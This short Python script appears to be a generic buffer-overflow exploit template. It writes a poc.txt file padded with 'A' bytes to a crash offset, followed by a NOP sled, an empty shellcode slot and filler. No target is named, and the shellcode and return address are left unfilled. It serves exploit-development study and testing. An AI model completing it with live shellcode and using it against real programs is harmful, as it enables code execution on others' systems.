#!/usr/bin/python
import sys, struct

filename = "poc.txt"

# Maximum length
maxlen = 5000

# Offsets
crash_reg = 100

# Shellcode
shellcode = b""

# Filling and nopping
nopchar = b"\x90"
prefiller = b"A"
prenop = nopchar * 200
postnop = nopchar * 16
postfiller = b"C"

# Prefix
prefix = prefiller * crash_reg
suffix = prenop
suffix += shellcode
suffix += postnop
suffix += postfiller * (maxlen - len(prefix + suffix))

# Concatenate string for payload
payload = prefix + suffix

try:
    file = open(filename,"wb")
    file.write(payload)
    file.close()
    print("[+] File " + filename + " with size " + str(len(payload)) + " created successfully")
except Exception as e:
    print("[!] Error creating file!" + str(e))
    sys.exit(1)

